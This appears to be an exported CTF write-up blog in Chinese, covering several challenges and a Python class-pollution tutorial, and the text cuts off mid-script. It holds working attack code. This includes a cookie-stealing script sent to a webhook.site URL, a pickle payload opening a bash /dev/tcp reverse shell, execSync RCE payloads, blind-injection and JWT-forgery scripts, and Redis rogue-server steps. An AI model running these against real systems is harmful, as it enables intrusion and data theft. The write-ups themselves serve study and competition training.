[{"title":"SECCON CTF 14 Quals-broken-challenge","path":"/2025/12/18/SECCON CTF 14 Quals-复现/","content":"broken-challenge自己看了做不出来，借鉴大佬的wp学习了。 考点:sxg窃取cookie SXG机制SXG 全名是Signed Exchange，是一种 让内容可以被安全地“转载”或“预加载”的技术。 SXG 使用缓存来预提取和传送已由来源进行加密签名的内容。这有助于加快从引荐来源网站进行跨源导航的速度，同时确保网页保持不变，并正确归因于其来源。 SXG 文件封装在二进制编码文件中，该文件包含两个主要组件：HTTP 交换和涵盖该交换的签名。HTTP 交换由请求网址、内容协商信息和 HTTP 响应组成。解码后的SXG长下面这样： format version: 1b3request: method: GET uri: https://example.org/ headers:response: status: 200 headers: Cache-Control: max-age=604800 Digest: mi-sha256-03=kcwVP6aOwYmA/j9JbUU0GbuiZdnjaBVB/1ag6miNUMY= Expires: Mon, 24 Aug 2020 16:08:24 GMT Content-Type: text/html; charset=UTF-8 Content-Encoding: mi-sha256-03 Date: Mon, 17 Aug 2020 16:08:24 GMT Vary: Accept-Encodingsignature: label;cert-sha256=emViFgi0WfQ+NotPJf8PBo2T5dEuZ13NdZefPybXq/HhE=/em; cert-url=quot;https://test.web.app/ViFgi0WfQ-NotPJf8PBo2T5dEuZ13NdZefPybXq_HhEquot;; date=1597680503;expires=1598285303;integrity=quot;digest/mi-sha256-03quot;;sig=emMEUCIQD5VqojZ1ujXXQaBt1CPKgJxuJTvFlIGLgkyNkC6d7LdAIgQUQ8lC4eaoxBjcVNKLrbS9kRMoCHKG67MweqNXy6wJg=/em; validity-url=quot;https://example.org/webpkg/validityquot;header integrity: sha256-Gl9bFHnNvHppKsv+bFEZwlYbbJ4vyf4MnaMMvTitTGQ=/ppThe exchange has a valid signature.payload [1256 bytes]:/ppre class=prettyprintcodelt;titlegt;SXG examplelt;/titlegt;lt;meta charset=#34;utf-8#34;gt;lt;meta http-equiv=#34;Content-type#34; content=#34;text/html; charset=utf-8#34;gt;lt;style type=#34;text/css#34;gt;body background-color: #f0f0f2; margin: 0; padding: 0;lt;/stylegt;/code/prediv h1Hello/h1/divp 工作流程 发布者（如 example.com）生成一个特殊格式的 .sxg 文件。这个文件里包含了：完整的网页内容（HTML、CSS、JS 等）。一个数字签名（这就是“SXG签名”），用于证明这个内容确实来自 example.com，且在签名后没有被篡改。签名的有效期（例如 7 天）。分发者（如 Google）获取这个 .sxg 文件，并存储在自己的 CDN 上。用户点击搜索结果时，浏览器从 Google 的 CDN 快速加载 .sxg 文件。浏览器收到文件后：验证签名是否有效（确保证书合法、内容未篡改）。验证签名中的网址是否与内容声称的来源一致。如果全部通过，浏览器就会像直接从 example.com 加载一样渲染页面，并在地址栏显示 https://example.com/article。 我个人把这个sxg文件理解为一种”缓存文件”，浏览器通过加载这个sxg文件，可以增快加载速度，这样提升速度。 回到题目题目源码index.js定义了一个bot路由 hint路由会把cert.key回显给我们 查看conf.js 这里定义了flag在cookie里 这里有一个关键点就是只有当我们的domain是hack.the.planet.seccon时候 才会把cookie设置为我们的flag。 那么域名来自于hack.the.planet.seccon，所以这里我们就需要伪造sxg文件来达到这个目的从而拿到flag 伪造sxg文件需要cert.key和cert.crt 写一个1.sh文件 ./1.sh https://your_ip:8080/ #!/bin/shURL=$1rm -rf server.key cert.csr cert.pem cert.cbor cert.oscp index.txt exploit.sxgopenssl ecparam -name prime256v1 -genkey -out server.keyopenssl req -new -sha256 -key server.key -out cert.csr \\ -subj /CN=hack.the.planet.secconopenssl x509 -req -days 90 -in cert.csr \\ -CA cert.crt -CAkey cert.key -CAcreateserial \\ -out cert.pem \\ -extfile (echo -e 1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL subjectAltName=DNS:hack.the.planet.seccon)SERIAL=$(openssl x509 -in cert.pem -serial -noout | cut -d= -f2)echo -e V\\t301231235959Z\\t\\t$SERIAL\\tunknown\\t/CN=hack.the.planet.seccon index.txtopenssl ocsp -index index.txt \\ -rsigner cert.crt -rkey cert.key \\ -CA cert.crt \\ -issuer cert.crt \\ -serial 0x$SERIAL \\ -respout cert.ocsp \\ -ndays 7gen-certurl -pem cert.pem -ocsp cert.ocsp cert.cborgen-signedexchange \\ -uri https://hack.the.planet.seccon/index.html \\ -content index.html \\ -certificate cert.pem \\ -privateKey server.key \\ -certUrl $URL/cert.cbor \\ -validityUrl https://hack.the.planet.seccon/validity \\ -o exploit.sxg index.html html body script window.location = https://webhook.site/8a43c6eb-66fb-46d1-9101-20fb28129c85?cookie= + encodeURIComponent(document.cookie); /script /body/html 起服务这样写 package mainimport ( log net/http path/filepath strings)func main() fs := http.FileServer(http.Dir(.)) http.HandleFunc(/, func(w http.ResponseWriter, r *http.Request) ext := strings.ToLower(filepath.Ext(r.URL.Path)) switch ext case .sxg: w.Header().Set(Content-Type, application/signed-exchange;v=b3) case .cbor: w.Header().Set(Content-Type, application/cert-chain+cbor) w.Header().Set(X-Content-Type-Options, nosniff) w.Header().Set(Cache-Control, no-store) fs.ServeHTTP(w, r) ) log.Println(Serving on :8080) if err := http.ListenAndServe(:8080, nil); err != nil log.Fatal(err) bot那写 https://your_ip:8080/expolit.sxg webhook接收到 cookie即可看到flag 还需要注意的点就是 https才能加载sxg","tags":["CTF-wp"]},{"title":"BackdoorCTF2025之Trust Issues","path":"/2025/12/08/xpath-注入/","content":"前言因为国际赛碰到了一个没见到过的注入–xpath 于是记录一下做题过程 赛题首先拿到就是有源码，网站就是一个登录注册点 分admin和非admin用户 有一个admin的面板 admin面板进去可以干一些操作 反正我们要先变成admin用户 审计源码 在login处存在明显的注入 并且当usernode布尔值为1的时候 会延迟两秒 符合xpath布尔盲注的条件 测试 or 1=1 #返回真 延迟两秒 or 1=2 #返回假 不延迟 确实如我们预料一般存在布尔盲注 这样我们可以得到admin的password xpath是没有注释符号 通过构造闭合来 于是有脚本 import requestsimport timedef quick_extract_admin(): url = http://104.198.24.52:6014/login print(get pasword...) def test(payload): start = time.time() try: requests.post(url, data=username: payload, password: anything, timeout=3) except: return False return time.time() - start 2.0 #判断password长度 for length in range(1, 30): payload = f or (username/text()=admin and string-length(password)=length) or 1=2 if test(payload): print(fpassword-length: length) break password = simple_charset = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 #盲注密码 for pos in range(1, length + 1): for char in simple_charset: payload = f or (username/text()=admin and substring(password,pos,1)=char) or 1=2 if test(payload): password += char print(fpostion pos: char) break else: password += _ print(fpostion pos: unkown) print(f password: password) return passwordquick_extract_admin() 靶机有些不稳定 多爆几次 admin密码是df08cf 进去后是一个添加文件的功能 这里存在cve 本地npm就可以看到 漏洞点在yam.load() 我们可以通过构造恶意yaml来RCE !!js/function function()return process.mainModule.require(child_process).execSync(cat flag.txt).toString();() xpath注入可以参考https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5的博客","tags":["CTF-wp"]},{"title":"HeroCTF v7-web","path":"/2025/12/04/HeroCTF v7-WEB/","content":"HeroCTF v7-WEBRevoked进去就是注册登录登出路由 看源码 主要是下面这几个路由 @app.route(/employees, methods=[GET])@token_requireddef employees(): query = request.args.get(query, ) conn = get_db_connection() cursor = conn.cursor() cursor.execute( fSELECT id, name, email, position FROM employees WHERE name LIKE %query% ) results = cursor.fetchall() conn.close() print(request.username) return render_template(employees.html, username=request.username, employees=results, query=query)@app.route(/admin, methods=[GET])@token_requireddef admin(): is_admin = getattr(request, is_admin, None) if is_admin: return render_template(admin.html, username=request.username, flag=FLAG) flash(You dont have the permission to access this area, error) return redirect(/employees) 在employee存在sql注入 union联合注入 看源码可以知道数据库的结构 def init_db(): conn = sqlite3.connect(database.db) cursor = conn.cursor() cursor.execute(DROP TABLE IF EXISTS employees;) cursor.execute(DROP TABLE IF EXISTS revoked_tokens;) cursor.execute(DROP TABLE IF EXISTS users;) cursor.execute(CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, is_admin BOOL NOT NULL, password_hash TEXT NOT NULL)) cursor.execute(CREATE TABLE IF NOT EXISTS revoked_tokens ( id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT NOT NULL)) cursor.execute(CREATE TABLE IF NOT EXISTS employees ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, email TEXT UNIQUE NOT NULL, position TEXT NOT NULL, phone TEXT NOT NULL, location TEXT NOT NULL)) conn.commit() conn.close() 所以我们sql注入的语句写成 1’ union select 1,id,3,username from users–+ 这样就可以查询到我们敏感信息 比如admin的password_hash 我们要拿到flag就需要以admin的身份访问admin 那么这里有两种做法 官方给的做法 是使用已知hash爆破明文密码用rockyou (?) 这道题其实还有两种解法 我放在revenge一起写 Revoked Revenge1’ union select 1,id,3,token from revoked_tokens–+ 可以看到被撤销的token 想办法让这个token有效 solution1修改 Base64 的文本表示形式，特别是那些不包含有效数据的部分，不会让我们的token失效并且我们还可以通过admin的验证 原理参考文章: https://security.stackexchange.com/questions/272746/jwt-able-to-change-signature-and-its-still-verified https://github.com/jwtk/jjwt/#base64-changing-characters 1. 签名验证只关心字节数组加密操作（如签名验证）始终在原始二进制数据（字节数组）上执行。Base64 只是一种将该字节数组转换为文本格式以便在 JSON 或 HTTP 中传输的编码方式。只要解码器从修改后的 Base64 字符串中得到了完全相同的原始字节数组，验证就会通过。2. Base64 存在“冗余”字符 (填充/不关心位)Base64 将 3 个字节编码成 4 个字符。 当原始签名长度不是 3 的倍数时（这是 RSA 签名等常见情况），最后一个 Base64 块是不完整的。在这个不完整的块中，最后一个（或倒数第二个）Base64 字符的部分位不代表原始数据，而是填充或“不关心”（dont care）的值。您可以更改这个字符，只要更改后的字符仍然保持那些“不关心”位，而不影响那些重要的、代表原始签名的位。结果： 不同的 Base64 字符串可以解码出相同的原始字节数组。示例： 更改一个字符为另一个具有相同前两位（有效数据位）的字符（例如 A 改为 P），不会改变解码后的签名。 得到的admin的jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY 值 (十进制) 6 位 (二进制) 有效位 (前 4 位) 最后一个 2 位 (不关心) Base64URL 字符 24 $011000_2$ $0110_2$ $00_2$ Y 25 $011001_2$ $0110_2$ $01_2$ Z 26 $011010_2$ $0110_2$ $10_2$ a 27 $011011_2$ $0110_2$ $11_2$ b 改为 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunZ solution2这里是因为处理输入的JWT时，对字符串形式和解码字节形式的处理不一致 这里我们给我们得到的jwt末尾加一个=就可以绕过revoked_tokens的绕过 因为这里判断是不是revoked_token是和数据库里的revoked_token字符串比较 我们加一个=填充可以绕过这个比较并且被解析成正确的jwt 得到 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY 改为 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY= Tomwhat进去就是tomwaht的面板 虽然我们不知道帐号密码 run.sh里面也写了 files=$(grep -Rl RemoteCIDRValve $CATALINA_HOME/conf $CATALINA_HOME/webapps || true) \\ for f in $files; do \\ sed -i s/allow=127.0.0.0\\/8,::1\\/128/allow=0.0.0.0\\/0,::\\/0/ $f; \\ done 这道题考点是tomwhat面板可以泄露session并且这里三个路由时共享session会话数据的 admin要求username为darth_sidious 但是light路由严禁输入darth_sidious 那么这样就可以刚刚我说的面板可以泄露session并且这里三个路由时共享session会话数据的点 参考文章https://www.freebuf.com/articles/web/247253.html examplesservletsservletSessionExample 可以生成根目录的session 这样就可以得到username为darth_sidious 的会话数据 直接访问darkadmin 就可以看到flag了","tags":["CTF-wp"]},{"title":"Redis主从复制RCE","path":"/2025/11/14/Redis主从复制RCE/","content":"Redis主从复制RCE概念Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C(就是c啦)编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。他比mysql快得多。 Redis 主从复制，就是指将一个 Redis 服务器（称为 主节点）的数据，复制到一个或多个其他 Redis 服务器（称为 从节点）的过程。 ​\t·主节点:通常负责写操作，所有客户端的请求都发送到主服务器。 ​\t·从节点:通常负责读操作，它们会精确地复制主节点的数据，客户端可以将读请求发送到从节点，以分担主节点的压力。 slave向master发送PSYNC命令得到的回应分类: a) 全量同步(+FULLRESYNC) 会将master上的RDB文件同步到slave上 b) 增量同步(+CONTINUE) slave向master要求数据同步，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件 特点:单向操作，只能从主节点复制到从节点 漏洞成因redis从4.0版本开始就允许用户自定义加载模块(redis module)，通过模块可以创建新的命令、数据类型、函数等。我们可以通过加载自己生成的恶意模块(so文件)从而可以实现在 redis 中实现一个新的 Redis 命令，从而来进行RCE。这里我们使用的是全量同步。 这里为什么要用到主从复制这个原理就是因为 Redis的命令集限制了我们。而主从复制攻击，表面上是“对主节点进行操作”（让目标作为从节点去连接我们控制的主节点），实质上是利用主从复制这个合法通道，将恶意模块从外部送入内部，最终达到在目标服务器上执行代码的目的。 redis常用命令 set xz Hacker # 设置键xz的值为字符串Hackerget xz # 获取键xz的内容SET score 857 # 设置键score的值为857INCR score # 使用INCR命令将score的值增加1GET score # 获取键score的内容keys * # 列出当前数据库中所有的键config set protected-mode no # 关闭安全模式get anotherkey # 获取一个不存在的键的值config set dir /root/redis # 设置保存目录config set dbfilename redis.rdb # 设置保存文件名config get dir # 查看保存目录config get dbfilename # 查看保存文件名save # 进行一次备份操作flushall # 删除所有数据del key # 删除键为key的数据slaveof ip port # 设置主从关系redis-cli -h ip -p 6379 -a passwd # 外部连接 漏洞利用条件redis版本 4.x、5.x 漏洞复现工具:https://github.com/n0b0dyCN/redis-rogue-server 环境搭建 docker pull damonevking/redis5.0docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 工具使用 python3 redis-rogue-server.py --rhost 192.168.137.129 --lhost 192.168.137.129 --exp=exp.so","tags":["CTF学习"]},{"title":"N1CTF2025-eezzjs","path":"/2025/11/11/[2025]N1CTF WP/","content":"[2025]N1CTF WPeezzjs这道题难点在于前半部分鉴权 后半部分在ycb亦有记载 使用.绕过对js后缀的绕过 思路有源码，app.js就告诉我们有一个登录路由必须以admin登录，具体校验方式是jwt 以admin身份登陆进去后可以上传文件，function serveIndex会渲染我们的ejs文件，于是我们可以上传恶意的ejs模板文件，从而来执行命令。 鉴权这一步你自己本地拿附件npm install的时候 他就会提醒你sha.js这个组件存在漏洞。 联网搜索搜到很有特征CVE-2025-9288 https://www.freebuf.com/articles/web/445352.html https://github.com/advisories/GHSA-95m3-7q98-8xr5 这里就引出了一个很新奇的概念:哈希回滚 哈希回滚 哈希计算过程中状态意外地回到了之前的某个点，使得后续计算总是从相同状态开始，产生固定结果。 漏洞验证 const forgeHash = (data, payload) = JSON.stringify([payload, length: -payload.length, [...data]])const sha = require(sha.js)const randomBytes = require(crypto)const sha256 = (...messages) = const hash = sha(sha256) messages.forEach((m) = hash.update(m)) return hash.digest(hex)const validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whateverconst payload = forgeHash(Buffer.concat(validMessage), Hashed input means safe)const receivedMessage = JSON.parse(payload) // e.g. over network, whateverconsole.log(sha256(...validMessage))console.log(sha256(...receivedMessage))console.log(receivedMessage[0]) 等价 require(sha.js)(sha256).update(foo).digest(hex)2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae require(sha.js)(sha256).update(fooabc).update(length:-3).digest(hex)2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae 回到我们这个题目当中来 我们的jwt的haeder和body都是解密token来获取，所以我们这个jwt格式里的length是可控的 const verifyJWT = (token, secret = JWT_SECRET) = if (typeof token !== string) return null; const parts = token.split(.); if (parts.length !== 3) return null; const [encodedHeader, encodedPayload, signature] = parts; let header; let payload; try header = JSON.parse(fromBase64Url(encodedHeader).toString()); payload = JSON.parse(fromBase64Url(encodedPayload).toString()); catch (err) return null; 原理就是我们可以通过控制jwt里面的length类控制这里的变量，这里length是header+secret的长度 下面是生成伪造admin seesion脚本 放在src目录运行 const signJWT, verifyJWT = require(./auth);const crypto = require(crypto);const header = alg: HS256, typ: JWT ;const len = -(JSON.stringify(header).length + 18);//关键一步token = signJWT(username:admin, length: len, crypto.randomBytes(9).toString(hex))console.log(token)console.log(verifyJWT(token, crypto.randomBytes(9).toString(hex))) 拿到session进入upload 就行 恶意ejs上传这里后面就是可以上传ejs文件 使用.绕过就可以了 ejs内容是 %= global.process.mainModule.require(child_process).execSync(cat /flag).toString() % 这里唯一要注意的点就是需要进行目录穿越 然后","tags":["CTF-wp"]},{"title":"浅谈python原型链污染","path":"/2025/11/06/python原型链污染/","content":"前言python原型链污染没系统学过，遇到要么是比较简单一把过，要么就是很难不会，但是还是决定来补一补坑(^_^) STUDY概念python原型链污染和js原型链污染的目的差不多，但是原理机制很不同，js是通过js的迭代特性使用__proto__Prototype，python是污染类属性值。 Python 对象通过 __class__ 指向类，类通过 __bases__ 指向父类；属性查找会根据 MRO（方法解析顺序）沿类继承链向上查找。 Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。 和js原型链污染一样，需要一个merge操作或者说需要一个函数进行合并这样我们才能进行原型链污染，所以当我们看到merge相关操作我们就可以联想原型链污染。 污染过程常见merge函数长这个样子 def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 其实这个函数挺绕的 调试代码如下: **通过对src的控制，来控制dst的值，来达到我们污染的 ** 完成dst.kv的污染 class father: secret = helloclass son_a(father): passclass son_b(father): passdef merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = __class__ : __base__ : secret : world print(son_a.secret)print(instance.secret)merge(payload, instance)print(son_a.secret)print(instance.secret) 跟着别人博客调试大概就懂这个过程了 刚进入for循环 dst值还是son_b() src是__class__ : __base__ : secret : world 经过了merge(v, getattr(dst, k))后 dst变为了son_b.__class__ 在经过一次merge(v, getattr(dst, k)) dst变为了father类也就是son_b.__class__.__base__ 然后因为v不是字典而是world 于是进入了这个else分支 setattr(dst, k, v) 此时 dst为son_b.__class__.__base__也就是father类 k为secret v 为world 那么就成功污染father类的secret属性，将其从hello污染成了world 自然son_b()作为father的子类同样收到影响。这就是污染的具体流程，自己跟着调试一遍会很清晰。我自己理解就是污染instance.__class__.__base__也就是代码里的father类的secret属性，把它的值变为world。 ！注意上述我们污染的是secret属性，并不是什么都能被污染，object类就不行。 而且我们污染的是father类secret属性并不是son_b()的，father是son_b()的父类，father类受到影响，sob_b()随之也会受到影响。 手法总结__base__获取目标类：刚刚调试的代码就是通过__base__来获取父类(调试代码里的father类)，但是如果和父子类没有关系我们应该怎么办呢?接下来会给一些其他的利用方式 __init__获取全局变量原理: 通过污染函数（如 __init__）的 __globals__ 属性，从而间接修改全局命名空间中的变量或类属性，导致任意对象被污染。 a=1def demo(): passclass A : def __init__(self): passprint(demo.__globals__==globals()==A.__init__.__globals__)#输出True 示例代码 a = 1def merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)def demo(): passclass A: def __init__(self): passclass B: classa = 2instance = A()payload = __init__: __globals__: a:4, B: classa:5 print(B.classa)print(a)merge(payload, instance)print(B.classa)print(a) 仿照上面的调试你也可以详细看到这个污染的过程。 最开始dst是A() 经过merge后变成了 A.__init 然后再经过一次merge变成了 A.__class__.init.__globals__看到了全局变量 然后因为dst当前是字典，因为不满足if dst.get(k) and type(v) == dict:进入else分支 将dst即全局变量里的a赋值为了4 v变成字典classa:5 接下来因为满足if分支 代码运行到merge(v, dst.get(k)) 此时 merge(v, dst.get(k)) 然后srcv，dstB() 经过判断直接进入了setattr(dst, k, v) 于是就把B里的classa的属性成功污染成了5 获取其他模块:在全局变量的前提下，是我们都在入口文件中的类对象或者属性来进行操作的，但是如果我们操作的位置在入口文件中，而目标对象并不在入口文件当中，这时候我们就需要对其他加载过的模块来获取了 import：在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以： import demopayload = __init__: __globals__: demo: a:4, B: classa:5 ##demo.pya = 1class B: classa = 2 sys：在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块 import syspayload = __init__: __globals__: sys: modules: demo: a:4, B: classa:5 loader：通过loader.__init__.__globals__[sys]来获取到sys模块，然后再获取到我们想要的模块，loader加载器在python中的作用是实现模块加载，其在importlib这一内置模块中有具体实现。而importlib模块下所有的py文件中均引入了sys模块。 __spec__，包含了关于类加载时候的信息。所以可以直接采用模块名.__spec__.__init__.__globals__[sys]获取到sys模块 函数形参默认值替换：关键信息替换：secret_keysecret_key是在当前入口文件下面的，所以我们可以直接通过__init__.__globals__获取全局变量 from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route(/,methods=[POST, GET])def index(): if request.data: merge(json.loads(request.data), instance) return [+]Config:%s%(app.config[SECRET_KEY])app.run(host=0.0.0.0) __init__ : __globals__ : app : config : SECRET_KEY :Polluted~ _got_first_request：payload= __init__: __globals__: app: _got_first_request:False _static_url_path:当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向 payload= __init__: __globals__: app: _static_folder:./ os.path.pardir:payload= __init__: __globals__: os: path: pardir:, Jinja语法标识符： __init__ : __globals__ : app : jinja_env :variable_start_string : [[,variable_end_string:]] 疑问但是我很奇怪就是开发者在开发的时候为什么会用到merge这玩意，感觉用处并不是很大啊。但是都学了，就在现有层面学吧，如果你知道欢迎加我的联系方式联系我！ 参考文章https://xz.aliyun.com/news/12518https://rycarl.cn/index.php/2025/04/28/python%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e4%bb%8e%e5%9f%ba%e7%a1%80%e5%88%b0%e6%b7%b1%e5%85%a5/https://j1rry-learn.github.io/posts/ctf-%E9%A2%98%E5%9E%8B-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E9%A2%98%E8%AE%B0%E5%92%8C%E6%80%BB%E7%BB%93-/","tags":["CTF学习"]},{"title":"WMCTF2025-WEB WP","path":"/2025/09/22/WMCTF2025/","content":"pdf2textpdf转txt的工具 源码审了审 没发现东西 给了hint pickle.loads 在pdfminer这个库 找到唯一一个pickle.loads的点 class CMapDB: _cmap_cache: Dict[str, PyCMap] = _umap_cache: Dict[str, List[PyUnicodeMap]] = class CMapNotFound(CMapError): pass @classmethod def _load_data(cls, name: str) - Any: name = name.replace(\\0, ) filename = %s.pickle.gz % name log.debug(loading: %r, name) cmap_paths = ( os.environ.get(CMAP_PATH, /usr/share/pdfminer/), os.path.join(os.path.dirname(__file__), cmap), ) for directory in cmap_paths: path = os.path.join(directory, filename) if os.path.exists(path): gzfile = gzip.open(path) try: return type(str(name), (), pickle.loads(gzfile.read())) finally: gzfile.close() raise CMapDB.CMapNotFound(name) 这段代码的作用是CMapDB 是一个管理 CMap（字符映射表）和 UnicodeMap（Unicode 映射表）缓存的数据库类。_load_data 方法用于根据映射表名称 name，查找并加载对应的 CMap 数据文件（如 cmap/ 目录下的 pickle.gz 文件），并将其反序列化为 Python 对象。如果找不到对应的文件，则抛出 CMapNotFound 异常。代码解释：name.replace(\\0, )：去除名称中的空字符，防止异常。filename = %s.pickle.gz % name：拼接出要查找的文件名。cmap_paths：定义了两个查找路径，优先使用环境变量 CMAP_PATH，否则用当前模块下的 cmap 目录。遍历 cmap_paths，每个目录下查找 filename 文件。如果文件存在，使用 gzip 打开并读取内容，然后用 pickle 反序列化为 Python 对象，并用 type 创建一个动态类型对象（名字为 name，内容为解包后的字典）。如果所有路径都找不到文件，则抛出 CMapNotFound 异常。简而言之，这段代码的作用是：根据 CMap 名称，自动查找并加载 PDF 字符映射表数据，为后续 PDF 解析和字符转换提供支持。 那么这个题的漏洞点在哪呢 就是我们要覆盖name字符集 来加载恶意的字符集让他pickle反序列化从而达到我们想要的目标 那么问题来了 怎么覆盖这个字符集文件呢? 问ai他说 那么就是在pdf文件里的 Encoding 指定我们上传的恶意字符集就可以了 最后会通过os.path.join直接加载这个文件 那么现在的思路非常明确了 1.先上传这个恶意的字符集文件 这个文件需要满足绕过对pdf的检查并且可以成功被gzip解压 2.再上传pdf加载这个恶意字符集文件从而触发我们的恶意命令 经过我的测试 当你明文为这个的时候可以绕过对pdf的检测 必须换行 trailer/Root 1xref 我们可以使用opcode或者pickle直接的数据也是可以的 import gzipimport zlibimport requestspdf = b(S\\trailer/Root 1xref\\def opcode(): a = (Sbash -c bash -i /dev/tcp/ip/2333 01iossystem. return a.encode()cmap_file = sauy122.pickle.gzwith gzip.open(cmap_file, wb) as f: f.write(opcode())comp = zlib.compressobj(level=0, method=zlib.DEFLATED, wbits=31)gz_bytes = comp.compress(pdf) + comp.flush()with open(cmap_file, ab) as f: f.write(gz_bytes)url = http://ip/requests.post(url + /upload,files=file: open(cmap_file, rb)) 上传成功后 监听端口就得到 PDF文件 %PDF-1.41 0 obj/Type /Catalog/Pages 2 0 Rendobj2 0 obj/Type /Pages/Kids [3 0 R]/Count 1endobj3 0 obj/Type /Page/Parent 2 0 R/MediaBox [0 0 612 792]/Resources /Font /F1 4 0 R/Contents 5 0 Rendobj4 0 obj/Type /Font/Subtype /Type0/BaseFont /HeiseiMin-W3/Encoding /#2Fapp#2Fuploads#2Fsauy122/DescendantFonts [6 0 R]endobj5 0 obj/Length 60streamBT/F1 12 Tf100 700 Td(Chinese Test) Tj0 -20 Td(Attack PDF) TjETendstreamendobj6 0 obj/Type /Font/Subtype /CIDFontType0/BaseFont /HeiseiMin-W3/CIDSystemInfo /Registry (Adobe)/Ordering (Japan1)/Supplement 0endobjxref0 70000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000251 00000 n 0000000369 00000 n 0000000489 00000 n trailer/Size 7/Root 1 0 Rstartxref%%EOF gz文件绕过pdf检测还有一种做法 来源于sc强强强！ 把pickle数据gzip压一下，然后 010editor 把里面表示文件名那一段替换成 odf原文 guess进去就是三个路由 注册和登录路由 还有一个api 那么api是当我们传入的作为key1等于我们随机数key2的时候 可以把我们的payload作为eval(payload, __builtin__:)执行命令 那么先看 def generate_random_string(): return str(rd.getrandbits(32)) 把这段直接扔浏览器搜索出来第一篇文章就是https://www.cnblogs.com/wandervogel/p/16805983.html MT19937伪随机数算法 mt19937的随机数生成器结构首先需要一个uint32的种子，然后生成一个具有624个uint32数组的状态数组。生成状态数组之后，进行一次旋转，最终可以输出624个随机的uint32。然后重复执行旋转操作。 文章里也写了 我们把624个随机数得到就可以预测接下来的随机数 于是写一个脚本 import requestsfrom random import Random# ---------- MT19937 tempering 反转 ----------def invert_right(m, l, val=): length = 32 mx = 0xffffffff if val == : val = mx i, res = 0, 0 while i * l length: mask = (mx (length - l) mx) (i * l) tmp = m mask m = m ^ (tmp l val) res += tmp i += 1 return resdef invert_left(m, l, val): length = 32 mx = 0xffffffff i, res = 0, 0 while i * l length: mask = (mx (length - l) mx) (i * l) tmp = m mask m ^= tmp l val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m, 18) m = invert_left(m, 15, 4022730752) m = invert_left(m, 7, 2636928640) m = invert_right(m, 11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3, tuple(state + [0]), None)) return gen# ---------- 从接口收集随机数 ----------prng = []api_url = http://47.109.207.123:11451/apiwhile len(prng) 624: r = requests.post(api_url, json=key:122) num = int(r.json()[message].split(:)[1]) prng.append(num) print(len(prng), num) # 打印收集进度# ---------- 克隆 MT 并预测后 20 个随机数 ----------g = 